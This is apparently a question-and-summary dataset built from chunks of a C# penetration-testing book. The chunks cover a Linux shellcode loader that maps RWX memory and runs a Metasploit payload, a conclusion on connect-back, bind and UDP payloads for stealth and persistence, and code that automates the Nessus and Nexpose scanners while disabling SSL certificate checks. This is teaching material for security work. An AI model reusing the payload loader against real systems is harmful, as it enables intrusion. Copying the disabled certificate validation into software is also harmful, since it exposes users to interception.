platforms. As Mono has developed, unofficial\nvalues for Unix-like system Platform properties have been introduced, so we\ntest the value of Platform directly against magic integer values rather than\nwell-defined enumeration values. The values 4, 6, and 128 can be used to\ndetermine whether we’re running a Unix-like system. Casting the Platform\nproperty to an int allows us to compare the Platform value to the integer\nvalues 4, 16, and 128.\nOnce we determine that we’re running on a Unix-like system, we can\nset up the values we need in order to execute our native assembly payloads.\nDepending on our current architecture, the payload byte array will be\nassigned either our x86 or x86-64 payload.\nAllocating Memory\nNow we begin allocating the memory to insert our assembly into memory,\nas shown in Listing 4-29.\nIntPtr ptr = IntPtr.Zero;\nIntPtr success = IntPtr.Zero;\nbool freeMe = false;\ntry\n{\nint pagesize = 4096;\nIntPtr length = (IntPtr)payload.Length;\nWriting Connect-Back, Binding, and Metasploit Payloads 99\nsuccess = uposix_memalign(ref ptr, (IntPtr)32, length);\nif (success != IntPtr.Zero)\n{\nConsole.WriteLine(\"Bail! memalign failed: \" + success);\nreturn;\n}\nListing 4-29: Allocating the memory using posix_memalign()\nFirst, we define a few variables: ptr, which should be assigned the\npointer at the beginning of our allocated memory by posix_memalign(), if\nall goes well; success, which will be assigned the value returned by posix_\nmemalign() if our allocation succeeds; and the Boolean value freeMe, which\nwill be true when the allocation succeeds so that we know when we need to\nfree the allocated memory. (We assign freeMe a value of false in case alloca-\ntion fails.)\nNext we start a try block to begin the allocation so we can catch any\nexceptions and exit the payload gracefully if an error occurs. We set a new\nvariable called pagesize to 4096, which is equal to the default memory page\nsize on most Linux installations.\nAfter assigning a new variable called length, which contains the length\nof our payload cast to an IntPtr, we call posix_memalign() u by passing the\nptr variable by reference so that posix_memalign() can alter the value directly\nwithout having to pass it back. We also pass the memory alignment (always\na multiple of 2; 32 is a good value) and the amount of memory we want to\nallocate. The posix_memalign() function will return IntPtr.Zero if the alloca-\ntion succeeds, so we check for this. If IntPtr.Zero was not returned, we print\na message about posix_memalign() failing and then return and exit from the\npayload. If the allocation is successful, we change the mode of the allocated\nmemory to be readable, writable, and executable, as shown in Listing 4-30.\nfreeMe = true;\nIntPtr alignedPtr = u(IntPtr)((int)ptr & ~(pagesize - 1)); //get page boundary\nIntPtr vmode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux\nsuccess = wmprotect(alignedPtr, (IntPtr)32, mode);\nif (success != IntPtr.Zero)\n{\nConsole.WriteLine(\"Bail! mprotect failed\");\nreturn;\n}\nListing 4-30: Changing the mode of the allocated memory\nnote The technique used to achieve shellcode execution on Linux will not work on an oper-\nating system that restricts the allocation of RWX memory. For example, if your Linux\ndistribution is running SELinux, these examples might not work on your machine.\nFor this reason, I recommend Ubuntu—because SELinux is not present, the examples\nshould run without issue.\n100 Chapter 4\nIn order to make sure we free the allocated memory later, we set freeMe\nto true. Next, we take the pointer that posix_memalign() set during allocation\n(the ptr variable) and create a page-aligned pointer using the page-aligned\nmemory space we allocated by performing a bitwise AND operation on the\npointer with the ones’ complement of our pagesize u. In essence, the ones’\ncomplement effectively turns our pointer address into a negative number so\nthat our math for setting the memory permissions adds up.\nBecause of the way Linux allocates memory in pages, we must change\nthe mode for the entire memory page where our payload memory was allo-\ncated. The bitwise AND with the ones’ complement of the current pagesize\nwill round the memory address given to us by posix_memalign() down to the\nbeginning of the memory page where the pointer resides. This allows us to\nset the mode for the full memory page being used by the memory allocated\nby posix_memalign().\nWe also create the mode to set the memory to by performing an OR\noperation on the values 0x04 (read), 0x02 (write), and 0x01 (execute) and\nstoring the value from the OR operations in the mode variable v. Finally, we\ncall mprotect() w by passing the aligned pointer of the memory page, the\nalignment of the memory (as passed into the posix_memalign() function),\nand the mode to set the memory to. Like the posix_memalign() function,\nIntPtr.Zero is returned if mprotect() successfully changes the mode of the\nmemory page. If IntPtr.Zero is not returned, we print an error message and\nreturn to exit the payload.\nCopying and Executing the Payload\nWe are now set up to copy our payload into our memory space and execute\nthe code, as shown in Listing 4-31.\nuMarshal.Copy(payload, 0, ptr, payload.Length);\nLinuxRun r = (LinuxRun)vMarshal.GetDelegateForFunctionPointer(ptr, typeof(LinuxRun));\nr();\n}\nfinally\n{\nif (freeMe)\nwfree(ptr);\n}\n}\nListing 4-31: Copying the payload to the allocated memory and executing the payload\nThe last few lines of Listing 4-31 should look similar to the code we\nwrote to execute the Windows payload (Listing 4-26). The Marshal.Copy()\nmethod u copies our payload into our allocated memory buffer and the\nMarshal.GetDelegateForFunctionPointer() method v turns the payload in mem-\nory into a delegate that we can call from our managed code. Once we have\na delegate pointing to our code in memory, we call it in order to execute\nthe code. A finally block following the try block frees the memory allocated\nby posix_memalign() if freeMe is set to true w.\nWriting Connect-Back, Binding, and Metasploit Payloads 101",
    "question": "What is the purpose of the code in Listing 4-34 that handles the HTTP stream in the SOAP fuzzer and checks for SQL errors?",
    "summary": "The text discusses how to create custom payloads for SQL injection testing and network communication using C#. It explains the process of building a SOAP fuzzer to detect SQL injection vulnerabilities by sending and receiving HTTP requests, and then covers how to create connect-back and binding payloads for TCP and UDP communication. Additionally, it details how to use the Metasploit framework to generate payloads in C# and execute them on both Windows and Linux systems by leveraging .NET's P/Invoke capabilities to call unmanaged code."
  },
  {
    "start": 68,
    "end": 68,
    "text": "Finally, we add our generated Windows and Linux payloads to the\ncross-platform payload, which allows us to compile and run the same pay-\nload on either Windows or Linux.\nConclusion\nIn this chapter, we discussed a few different ways to create custom payloads\nthat are useful in a variety of circumstances.\nPayloads that utilize TCP can provide benefits when you are attacking\na network, from getting a shell from an internal network to maintaining\npersistence. Using a connect-back technique, you can achieve a shell on\na remote box, thus aiding in a phishing campaign, for example, where a\npentest is completely external from the network. A bind technique, on the\nother hand, can help you maintain persistence on boxes without having to\nexploit the vulnerability on the machine again if internal access to the net-\nwork is available.\nPayloads that communicate over UDP can often get around poorly con-\nfigured firewalls and might be able to bypass an intrusion detection system\nfocused on TCP traffic. Although less reliable than TCP, UDP offers the\nspeed and stealth that the heavily scrutinized TCP generally can’t provide.\nBy using a UDP payload that listens for incoming broadcasts, attempts to\nexecute the commands sent, and then broadcasts the results back you, your\nattacks can be a bit quieter and possibly stealthier at the expense of stability.\nMetasploit allows an attacker to create many types of payloads on the\nfly, and it’s easy to install and get running. Metasploit includes the msfvenom\ntool, which creates and encodes payloads for use in exploits. Using the\nmsfvenom tool to generate native assembly payloads, you can build a small,\ncross-platform executable to detect and run shellcode for a variety of oper-\nating systems. This gives you great flexibility in the payloads that are run\non a target’s box. It also makes use of one of the most powerful and useful\nMetasploit features available.\n102 Chapter 4",
    "question": "What are the advantages of using TCP versus UDP payloads in penetration testing and how does Metasploit facilitate the creation of cross-platform payloads?",
    "summary": "The text discusses methods for creating custom payloads for both Windows and Linux, which can be compiled and run cross-platform. It highlights the advantages of TCP payloads for network attacks and bind techniques for persistence, as well as UDP payloads for bypassing firewalls and intrusion detection systems. Metasploit is noted for its ability to generate various payloads quickly and efficiently, offering flexibility and utility in different attack scenarios."
  },
  {
    "start": 69,
    "end": 77,
    "text": "5\nau toMa tinG neSSuS\nNessus is a popular and powerful vulner-\nability scanner that uses a database of known\nvulnerabilities to assess whether a given sys-\ntem on a network is missing any patches or is\nvulnerable to known exploits. In this chapter, I’ll show\nyou how to write classes to interact with the Nessus API\nto automate, configure, and run a vulnerability scan.\nNessus was first developed as an open source vulnerability scanner,\nbut it became closed source in 2005 after being purchased by Tenable\nNetwork Security. As of this writing, Tenable offers a seven-day trial of\nNessus Professional and a limited version called Nessus Home. The biggest\ndifference between the two is that Nessus Home allows you to scan only\n16 IP addresses at once, but Home should be sufficient for you to run the\nexamples in this chapter and become familiar with the program. Nessus is\nparticularly popular with professionals who help scan and manage other\ncompanies’ networks. Follow the instructions on the Tenable site https://\nwww.tenable.com/products/nessus-home/ to install and configure Nessus Home.\nMany organizations require regular vulnerability and patch scanning\nin order to manage and identify risks on their network, as well as for com-\npliance purposes. We’ll use Nessus to accomplish these goals by building\nclasses to help us perform unauthenticated vulnerability scans against hosts\non a network.\nreSt and the nessus aPi\nThe advent of web applications and APIs has given rise to an architecture of\nAPIs called REST APIs. REST (representational state transfer) is a way of access-\ning and interacting with resources (such as user accounts or vulnerability\nscans) on the server, usually over HTTP, using a variety of HTTP methods\n(GET, POST, DELETE, and PUT). HTTP methods describe our intent in\nmaking the HTTP request (for example, do we want to create a resource\nor modify a resource?), kind of like CRUD (Create, Read, Update, Delete)\noperations in databases.\nFor instance, take a look at the following simple GET HTTP request,\nwhich is like a read operation for a database (like SELECT * FROM users WHERE\nid = 1):\nGET /users/u1 HTTP/1.0\nHost: 192.168.0.11\nIn this example, we’re requesting information for the user with an ID\nof 1. To get the information for another user’s ID, you could replace the 1 u\nat the end of the URI with that user’s ID.\nTo update the information for the first user, the HTTP request might\nlook like this:\nPOST /users/1 HTTP/1.0\nHost: 192.168.0.11\nContent-Type: application/json\nContent-Length: 24\n{\"name\": \"Brandon Perry\"}\nIn our hypothetical RESTful API, the preceding POST request would\nupdate the first user’s name to Brandon Perry. Commonly, POST requests\nare used to update a resource on the web server.\nTo delete the account entirely, use DELETE, like so:\nDELETE /users/1 HTTP/1.0\nHost: 192.168.0.11\nThe Nessus API will behave similarly. When consuming the API, we’ll\nsend JSON to and receive JSON from the server, as in these examples. The\nclasses we’ll write in this chapter are designed to handle the ways that we\ncommunicate and interact with the REST API.\n104 Chapter 5\nOnce you have Nessus installed, you can find the Nessus REST API\ndocumentation at https://<IP address>:8834/api. We’ll cover only a few of the\ncore API calls used to drive Nessus to perform vulnerability scans.\nthe nessusSession Class\nTo automate sending commands and receiving responses from Nessus, we’ll\ncreate a session with the NessusSession class and execute API commands, as\nshown in Listing 5-1.\npublic class NessusSession : uIDisposable\n{\npublic vNessusSession(string host, string username, string password)\n{\nServicePointManager.ServerCertificateValidationCallback =\n(Object obj, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors) => true;\nthis.Host = whost;\nif (x!Authenticate(username, password))\nthrow new Exception(\"Authentication failed\");\n}\npublic bool yAuthenticate(string username, string password)\n{\nJObject obj = znew JObject();\nobj[\"username\"] = username;\nobj[\"password\"] = password;\nJObject ret = {MakeRequest(WebRequestMethods.Http.Post, \"/session\", obj);\nif (ret [\"token\"] == null)\nreturn false;\nthis.|Token = ret[\"token\"].Value<string>();\nthis.Authenticated = true;\nreturn true;\n}\nListing 5-1: The beginning of the NessusSession class showing the constructor and Authenticate() method\nAs you can see in Listing 5-1, this class implements the IDisposable inter-\nface u so that we can use the NessusSession class within a using statement. As\nyou may recall from earlier chapters, the IDisposable interface allows us to\nautomatically clean up our session with Nessus by calling Dispose(), which\nwe’ll implement shortly, when the currently instantiated class in the using\nstatement is disposed during garbage collection.\nAt w, we assign the Host property to the value of the host parameter\npassed to the NessusSession constructor v, and then we try to authen-\nticate x since any subsequent API calls will require an authenticated\nAutomating Nessus 105\nsession. If authentication fails, we throw an exception and print the alert\n\"Authentication failed\". If authentication succeeds, we store the API key for\nlater use.\nIn the Authenticate() method y, we create a JObject z to hold the cre-\ndentials passed in as arguments. We’ll use these to attempt to authenticate,\nand then we’ll call the MakeRequest() method { (discussed next) and pass\nthe HTTP method, the URI of the target host, and the JObject. If authen-\ntication succeeds, MakeRequest() should return a JObject with an authentica-\ntion token; if authentication fails, it should return an empty JObject.\nWhen we receive the authentication token, we assign its value to the\nToken property |, assign the Authenticated property to true, and return true\nto the caller method to tell the programmer that authentication succeeded.\nIf authentication fails, we return false.\nMaking the HTTP Requests\nThe MakeRequest() method makes the actual HTTP requests and then\nreturns the responses, as shown in Listing 5-2.\npublic JObject MakeRequest(string method, string uri, uJObject data = null, string token = null)\n{\nstring url = v\"https://\" + this.Host + \":8834\" + uri;\nHttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);\nrequest.wMethod = method;\nif (!string.IsNullOrEmpty(token))\nrequest.Headers [\"X-Cookie\"] = x\"token=\" + token;\nrequest.yContentType = \"application/json\";\nif (data != null)\n{\nbyte[] bytes = System.Text.Encoding.ASCII.zGetBytes(data.ToString());\nrequest.ContentLength = bytes.Length;\nusing (Stream requestStream = request.GetRequestStream())\nrequestStream.{Write(bytes, 0, bytes.Length);\n}\nelse\nrequest.ContentLength = 0;\nstring response = string.Empty;\ntry |\n{\nusing (StreamReader reader = new }StreamReader(request.GetResponse().GetResponseStream()))\nresponse = reader.ReadToEnd();\n}\ncatch\n{\nreturn new JObject();\n}\nif (string.IsNullOrEmpty(response))\nreturn new JObject();\n106 Chapter 5\nreturn JObject.~Parse(response);\n}\nListing 5-2: The MakeRequest() method from the NessusSession class\nThe MakeRequest() method has two required parameters (HTTP and\nURI) and two optional ones (the JObject and the authentication token).\nThe default value for each is null.\nTo create MakeRequest(), we first create the base URL for the API calls v\nby combining the host and URI parameters and passing in the result as the\nsecond argument; then we use HttpWebRequest to build the HTTP request and\nset the property of HttpWebRequest Method w to the value of the method variable\npassed into MakeRequest() method. Next, we test whether the user supplied\nan authentication token in JObject. If so, we assign the HTTP request header\nX-Cookie to the value of the token parameter x, which Nessus will look for\nwhen we authenticate. We set the ContentType property y of the HTTP request\nto application/json to ensure that the API server knows how to deal with the\ndata we are sending in the body of the request (otherwise, it will refuse to\naccept the request).\nIf a JObject is passed to MakeRequest() in the third argument u, we convert\nit to a byte array using GetBytes() z, because the Write() method can only\nwrite bytes. We assign the ContentLength property to the size of the array and\nthen use Write() { to write the JSON to the request stream. If the JObject\npassed to MakeRequest() is null, we simply assign the value 0 to ContentLength\nand move on, since we will not be putting any data in the request body.\nHaving declared an empty string to hold the response from the server,\nwe begin a try/catch block at | to receive the response. Within a using state-\nment, we create a StreamReader } to read the HTTP response by passing the\nserver’s HTTP response stream to the StreamReader constructor; then we call\nReadToEnd() to read the full response body into our empty string. If reading\nthe response causes an exception, we can expect that the response body is\nempty, so we catch the exception and return an empty JObject to ReadToEnd().\nOtherwise, we pass the response to Parse() ~ and return the resulting\nJObject.\nLogging Out and Cleaning Up\nTo finish the NessusSession class, we’ll create LogOut() to log us out of the\nserver and Dispose() to implement the IDisposable interface, as shown in\nListing 5-3.\npublic void uLogOut()\n{\nif (this.Authenticated)\n{\nMakeRequest(\"DELETE\", \"/session\", null, this.Token);\nthis.Authenticated = false;\n}\n}\nAutomating Nessus 107\npublic void vDispose()\n{\nif (this.Authenticated)\nthis.LogOut();\n}\npublic string Host { get; set; }\npublic bool Authenticated { get; private set; }\npublic string Token { get; private set; }\n}\nListing 5-3: The last two methods of the NessusSession class, as well as the Host,\nAuthenticated, and Token properties\nThe LogOut() method u tests whether we’re authenticated with the\nNessus server. If so, we call MakeRequest() by passing DELETE as the HTTP\nmethod; /session as the URI; and the authentication token, which sends\na DELETE HTTP request to the Nessus server, effectively logging us out.\nOnce the request is complete, we set the Authenticated property to false. In\norder to implement the IDisposable interface, we create Dispose() v to log\nus out if we are authenticated.\nTesting the NessusSession Class\nWe can easily test the NessusSession class with a small Main() method, as\nshown in Listing 5-4.\npublic static void uMain(string[] args)\n{\nvusing (NessusSession session = new wNessusSession(\"192.168.1.14\", \"admin\", \"password\"))\n{\nConsole.xWriteLine(\"Your authentication token is: \" + session.Token);\n}\n}\nListing 5-4: Testing the NessusSession class to authenticate with NessusManager\nIn the Main() method u, we create a new NessusSession w and pass the\nIP address of the Nessus host, the username, and the Nessus password as\nthe arguments. With the authenticated session, we print the authentication\ntoken x Nessus gave us on successful authentication and then exit.\nnote The NessusSession is created in the context of a using statement v, so the Dispose()\nmethod we implemented in the NessusSession class will be automatically called when\nthe using block ends. This logs out the NessusSession, invalidating the authentica-\ntion token we were given by Nessus.\nRunning this code should print an authentication token similar to the\none in Listing 5-5.\n108 Chapter 5\n$ mono ./ch5_automating_nessus.exe\nYour authentication token is: 19daad2f2fca99b2a2d48febb2424966a99727c19252966a\n$\nListing 5-5: Running the NessusSession test code to print the authentication token\nthe nessusManager Class\nListing 5-6 shows the methods we need to implement in the NessusManager\nclass, which will wrap common API calls and functionality for Nessus in\neasy-to-use methods we can call later.\npublic class NessusManager : uIDisposable\n{\nNessusSession _session;\npublic NessusManager(NessusSession session)\n{\n_session = vsession;\n}\npublic JObject GetScanPolicies()\n{\nreturn _session.wMakeRequest(\"GET\", \"/editor/policy/templates\", null, _session.Token);\n}\npublic JObject CreateScan(string policyID, string cidr, string name, string description)\n{\nJObject data = xnew JObject();\ndata[\"uuid\"] = policyID;\ndata[\"settings\"] = new JObject();\ndata[\"settings\"][\"name\"] = name;\ndata[\"settings\"][\"text_targets\"] = cidr;\ndata[\"settings\"][\"description\"] = description;\nreturn _session.yMakeRequest(\"POST\", \"/scans\", data, _session.Token);\n}\npublic JObject StartScan(int scanID)\n{\nreturn _session.MakeRequest(\"POST\", \"/scans/\" + scanID + \"/launch\", null, _session.Token);\n}\npublic JObject zGetScan(int scanID)\n{\nreturn _session.MakeRequest(\"GET\", \"/scans/\" + scanID, null, _session.Token);\n}\npublic void Dispose()\n{\nif (_session.Authenticated)\n_session.{LogOut();\nAutomating Nessus 109\n_session = null;\n}\n}\nListing 5-6: The NessusManager class\nThe NessusManager class implements IDisposable u so that we can\nuse NessusSession to interact with the Nessus API and log out automati-\ncally if necessary. The NessusManager constructor takes one argument, a\nNessusSession, and assigns it to the private _session variable v, which any\nmethod in NessusManager can access.\nNessus is preconfigured with a few different scan policies. We’ll sort\nthrough these policies using GetScanPolicies() and MakeRequest() w to\nretrieve a list of policies and their IDs from the /editor/policy/templates URI.\nThe first argument to CreateScan() is the scan policy ID, and the second is\nthe CIDR range to scan. (You can also enter a newline-delimited string of\nIP addresses in this argument.)\nThe third and fourth arguments can be used to hold a name and\ndescription of the scan, respectively. We’ll use a unique Guid (globally unique\nID, long strings of unique letters and numbers) for each names since our\nscan is only for testing purposes, but as you build more sophisticated auto-\nmation, you may want to adopt a system of naming scans in order to make\nthem easier to track. We use the arguments passed to CreateScan() to create\na new JObject x containing the settings for the scan to create. We then pass\nthis JObject to MakeRequest() y, which will send a POST request to the /scans\nURI and return all relevant information about the particular scan, show-\ning that we successfully created (but did not start!) a scan. We can use the\nscan ID to report the status of a scan.\nOnce we’ve created the scan with CreateScan(), we’ll pass its ID to the\nStartScan() method, which will create a POST request to the /scans/<scanID>/\nlaunch URI and return the JSON response telling us whether the scan was\nlaunched. We can use GetScan() z to monitor the scan.\nTo complete NessusManager, we implement Dispose() to log out of the ses-\nsion { and then clean up by setting the _session variable to null.\nPerforming a nessus Scan\nListing 5-7 shows how to begin using NessusSession and NessusManager to run a\nscan and print the results.\npublic static void Main(string[] args)\n{\nServicePointManager.uServerCertificateValidationCallback =\n(Object obj, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors) => true;\nusing (NessusSession session = vnew NessusSession(\"192.168.1.14\", \"admin\", \"password\"))\n{\nusing (NessusManager manager = new NessusManager(session))\n{\n110 Chapter 5\nJObject policies = manager.wGetScanPolicies();\nstring discoveryPolicyID = string.Empty;\nforeach (JObject template in policies[\"templates\"])\n{\nif (template [\"name\"].Value<string>() == x\"basic\")\ndiscoveryPolicyID = template [\"uuid\"].Value<string>();\n}\nListing 5-7: Retrieving the list of scan policies so we can start a scan with the correct scan policy\nWe begin our automation by first disabling SSL certificate verification\n(because the Nessus server’s SSL keys are self-signed, they will fail verifi-\ncation) by assigning an anonymous method that only returns true to the\nServerCertificateValidationCallback u. This callback is used by the HTTP\nnetworking libraries to verify an SSL certificate. Simply returning true\ncauses any SSL certificate to be accepted. Next, we create a NessusSession v\nand pass it the IP address of the Nessus server as well as the username and\npassword for the Nessus API. If authentication succeeds, we pass the new\nsession to another NessusManager.\nOnce we have an authenticated session and a manager, we can begin\ninteracting with the Nessus server. We first get a list of the scan policies\navailable with GetScanPolicies() w and then create an empty string with\nstring.Empty to hold the scan policy ID for the basic scan policy and iterate\nover the scan policy templates. As we iterate over the scan policies, we check\nwhether the name of the current scan policy equals the string basic x; this\nis a good starting point for a scan policy that allows us to perform a small\nset of unauthenticated checks against hosts on the network. We store the ID\nfor the basic scan policy for later use.\nNow to create and start the scan with the basic scan policy ID, as shown\nin Listing 5-8.\nJObject scan = manager.uCreateScan(discoveryPolicyID, \"192.168.1.31\",\n\"Network Scan\", \"A simple scan of a single IP address.\");\nint scanID = vscan[\"scan\"][\"id\"].Value<int>();\nmanager.wStartScan(scanID);\nJObject scanStatus = manager.GetScan(scanID);\nwhile (scanStatus[\"info\"][\"status\"].Value<string>() != x\"completed\")\n{\nConsole.WriteLine(\"Scan status: \" + scanStatus[\"info\"]\n[\"status\"].Value<string>());\nThread.Sleep(5000);\nscanStatus = manager.yGetScan(scanID);\n}\nforeach (JObject vuln in scanStatus[\"vulnerabilities\"])\nConsole.WriteLine(vuln.ToString());\n}\n}\nListing 5-8: The second half of the Nessus automation Main() method\nAutomating Nessus 111\nAt u, we call CreateScan(), passing in a policy ID, IP address, name, and\ndescription of the method, and we store its response in a JObject. We then\npull the scan ID out of the JObject v so that we can pass the scan ID to\nStartScan() w to start the scan.\nWe use GetScan() to monitor the scan by passing it the scan ID, stor-\ning the result in a JObject and using a while loop to continually check\nwhether the current scan status has completed x. If the scan has not com-\npleted, we print its status, sleep for five seconds, and call GetScan() y again.\nThe loop repeats until the scan reports completed, at which point we iterate\nover and print each vulnerability returned by GetScan() in a foreach loop,\nwhich may look something like Listing 5-9. A scan might take several min-\nutes to complete, depending on your computer and network speed.\n$ mono ch5_automating_nessus.exe\nScan status: running\nScan status: running\nScan status: running\n--snip--\n{\n\"count\": 1,\n\"plugin_name\": u\"SSL Version 2 and 3 Protocol Detection\",\n\"vuln_index\": 62,\n\"severity\": 2,\n\"plugin_id\": 20007,\n\"severity_index\": 30,\n\"plugin_family\": \"Service detection\"\n}\n{\n\"count\": 1,\n\"plugin_name\": v\"SSL Self-Signed Certificate\",\n\"vuln_index\": 61,\n\"severity\": 2,\n\"plugin_id\": 57582,\n\"severity_index\": 31,\n\"plugin_family\": \"General\"\n}\n{\n\"count\": 1,\n\"plugin_name\": \"SSL Certificate Cannot Be Trusted\",\n\"vuln_index\": 56,\n\"severity\": 2,\n\"plugin_id\": 51192,\n\"severity_index\": 32,\n\"plugin_family\": \"General\"\n}\nListing 5-9: Partial output from an automated scan using the Nessus vulnerability scanner\nThe scan results tell us that the target is using weak SSL modes (proto-\ncols 2 and 3) u and a self-signed SSL certificate on an open port v. We can\nnow ensure that the server’s SSL configurations are using fully up-to-date\n112 Chapter 5\nSSL modes and then disable the weak modes (or disable the service alto-\ngether). Once finished, we can rerun our automated scan to ensure\nthat Nessus no longer reports any weak SSL modes in use.\nConclusion\nThis chapter has shown you how to automate various aspects of the Nessus\nAPI in order to complete an unauthenticated scan of a network-attached\ndevice. In order to achieve this, we needed to be able to send API requests\nto the Nessus HTTP server. To do so, we created the NessusSession class;\nthen, once we were able to authenticate with Nessus, we created the\nNessusManager class to create, run, and report the results of a scan. We\nwrapped everything with code that used these classes to drive the Nessus\nAPI automatically based on user-provided information.\nThis isn’t the extent of the features Nessus provides, and you’ll find\nmore detail in the Nessus API documentation. Many organizations require\nperforming authenticated scans against hosts on the network in order to\nget full patch listings to determine host health, and upgrading our automa-\ntion to handle this would be a good exercise.\nAutomating Nessus 113",
    "question": "How can the NessusSession and NessusManager classes be used to automate the process of running an unauthenticated vulnerability scan against network hosts?",
    "summary": "Nessus is a vulnerability scanner that can be automated using its REST API. This chapter explains how to create classes, such as NessusSession and NessusManager, to interact with the API and perform scans. The NessusSession class handles authentication and communication with the server, while the NessusManager class simplifies common API calls for scanning and reporting vulnerabilities. The example demonstrates how to authenticate, create and start a scan, and retrieve results, showing the potential for automating network security checks."
  },
  {
    "start": 78,
    "end": 88,
    "text": "6\nau toMa tinG ne xPoSe\nNexpose is a vulnerability scanner similar\nto Nessus but geared toward enterprise-\nlevel vulnerability management. This means\nnot only helping system admins find which\nboxes need patches, but also helping them mitigate\nand prioritize the potential vulnerabilities over time.\nIn this chapter, I show you how to use C# to automate Rapid7’s Nexpose\nvulnerability scanner in order to create a Nexpose site, scan that site, create\na PDF report of the site’s vulnerabilities, and then delete the site. Nexpose’s\nreporting is incredibly flexible and powerful, allowing you to automatically\ngenerate reports for a wide variety of audiences, from executives to techni-\ncal admins.\nLike the Nessus scanner discussed in Chapter 5, Nexpose uses the\nHTTP protocol to expose its API, but it uses XML instead of JSON to for-\nmat data. As in Chapter 5, we’ll write two separate classes: one to communi-\ncate with the Nexpose API (the session class) and another to drive the API\n(the manager class). Once we’ve written the classes, you’ll learn how to run\na scan and view the results.\ninstalling nexpose\nNexpose is available in various forms and editions from Rapid7. We’ll use\nthe Nexpose binary installer from Rapid7 on a fresh Ubuntu 14.04 LTS\nmachine using the commands and URL shown in Listing 6-1. This URL\nis updated with the latest installer whenever new versions are released. If\nthe URL doesn’t work for whatever reason, you can also find a download\nlink after registering for a Community activation key (required to run\nNexpose). After downloading the installer, we need to set the executable\nfile permission so we can subsequently run the installer as root.\n$ wget http://download2.rapid7.com/download/NeXpose-v4/NeXposeSetup-Linux64.bin\n$ chmod +x ./NeXposeSetup-Linux64.bin\n$ sudo ./NeXposeSetup-Linux64.bin\nListing 6-1: Downloading and installing Nexpose\nWhen the installer is run in a graphical desktop environment, such\nas KDE or GNOME, a graphical installer is presented for the user to step\nthrough for the initial configuration, as shown in Figure 6-1. If you are\ninstalling Nexpose through a text-based environment, such as SSH, the\ninstaller should step through configuration with yes/no questions and\nother prompts for information.\nFigure 6-1: The graphical Nexpose installer\nOnce Nexpose is installed, run ifconfig in a terminal to see the IP\naddress open in the web browser. Then enter https://ip:3780/ into the\nbrowser, replacing ip with the IP address of the machine running Nexpose.\nYou should see the Nexpose login page, as shown in Figure 6-2.\n116 Chapter 6\nFigure 6-2: The Nexpose login page\nUse the credentials asked for during setup. You may see an SSL certifi-\ncate error before being presented with the login page. Because Nexpose\nuses a self-signed SSL certificate by default, your browser probably doesn’t\ntrust it and may complain. This is normal and expected.\nActivation and Testing\nWhen you first log in, you should be prompted to enter the activation key\nyou were sent in an email from Rapid7 after registering for the Community\nEdition, as shown in Figure 6-3.\nFigure 6-3: The activation modal pop-up in Nexpose\nAutomating Nexpose 117\nNow test your installation to make sure you have activated the software\ncorrectly and can authenticate with the Nexpose API by sending an HTTP\nrequest. You can use the curl utility to make an authentication request to\nthe API and display the response, as shown in Listing 6-2.\n$ curl -d '<LoginRequest user-id=\"nxadmin\" password=\"nxpassword\"/>' -X POST -k \\\n-H \"Content-Type: text/xml\" https://192.168.1.197:3780/api/1.1/xml\n<LoginResponse success=\"1\" session-id=\"D45FFD388D8520F5FE18CACAA66BE527C1AF5888\"/>\n$\nListing 6-2: Successfully authenticating with the Nexpose API using curl\nIf you see a response containing success=\"1\" and a session ID, Nexpose\nhas been correctly activated, and the API is functioning as expected with\nyour credentials.\nSome Nexpose Parlance\nBefore we discuss managing and reporting on vulnerability scans in Nexpose\nany further, we need to define a couple of terms. When you start a vulner-\nability scan in Nexpose, you scan a site, which is a collection of related hosts\nor assets.\nNexpose has two types of sites: static sites and dynamic sites. We will\nfocus on the former during our automation. A static site holds a list of\nhosts you can only change by reconfiguring the site. This is why it is called\nstatic—the site won’t change over time. Nexpose also supports creating sites\nbased on asset filters, so the assets in a dynamic site may change from one\nweek to another based on their vulnerability count or inability to authen-\nticate. Dynamic sites are more complex, but they are much more powerful\nthan static sites and are a great feature to familiarize yourself with as extra\nhomework.\nThe assets that make up the sites are simply connected devices on\nyour network that Nexpose can communicate with. These assets can be\nbare-metal data center rack servers, VMware ESXi hosts, or Amazon AWS\ninstances. If you can ping it with an IP address, it can be an asset in your\nNexpose site. Many times, it is beneficial to separate the hosts on your\nphysical network into logical sites in Nexpose so you can more granularly\nscan and manage vulnerabilities. A sophisticated enterprise network may\nhave a site specifically for ESXi hosts, a site for the C-level executive network\nsegment, and a site for the customer service call center assets.\nthe nexposeSession Class\nWe’ll begin by writing the NexposeSession class to communicate with the\nNexpose API, as shown in Listing 6-3.\npublic class NexposeSession : IDisposable\n{\npublic uNexposeSession(string username, string password, string host,\n118 Chapter 6\nint port = v3780, NexposeAPIVersion version = wNexposeAPIVersion.v11)\n{\nthis.xHost = host;\nthis.Port = port;\nthis.APIVersion = version;\nServicePointManager.yServerCertificateValidationCallback = (s, cert, chain, ssl) => true;\nthis.zAuthenticate(username, password);\n}\npublic string Host { get; set; }\npublic int Port { get; set; }\npublic bool IsAuthenticated { get; set; }\npublic string SessionID { get; set; }\npublic NexposeAPIVersion APIVersion { get; set; }\nListing 6-3: The beginning of the NexposeSession class with constructor and properties\nThe NexposeSession class constructor u takes up to five argu-\nments: three are required (username, password, and the host to con-\nnect to), and two are optional (the port and API version, with defaults\nof 3780 v and NexposeAPIVersion.v11 w, respectively). Beginning at x,\nwe assign the properties Host, Port, and APIVersion to the three required\narguments. Next, we disable SSL certificate verification at y by setting\nServerCertificateValidationCallback to always return true. Doing so violates\ngood security principles, but we disable verification because Nexpose runs\non HTTPS with a self-signed certificate by default. (Otherwise, SSL certifi-\ncate verification would fail during the HTTP request.)\nAt z, we attempt to authenticate by calling the Authenticate() method,\nshown expanded in Listing 6-4.\npublic XDocument uAuthenticate(string username, string password)\n{\nXDocument cmd = new vXDocument(\nnew XElement(\"LoginRequest\",\nnew XAttribute(\"user-id\", username),\nnew XAttribute(\"password\", password)));\nXDocument doc = (XDocument)this.wExecuteCommand(cmd);\nxif (doc.Root.Attribute(\"success\").Value == \"1\")\n{\nythis.SessionID = doc.Root.Attribute(\"session-id\").Value;\nthis.IsAuthenticated = true;\n}\nelse\nthrow new Exception(\"Authentication failed\");\nzreturn doc;\n}\nListing 6-4: The NexposeSession class’s Authenticate() method\nAutomating Nexpose 119\nThe Authenticate() method u takes as arguments a username and a\npassword. To send the username and password to the API for authentica-\ntion, we create an XDocument at v with root node LoginRequest and user-id 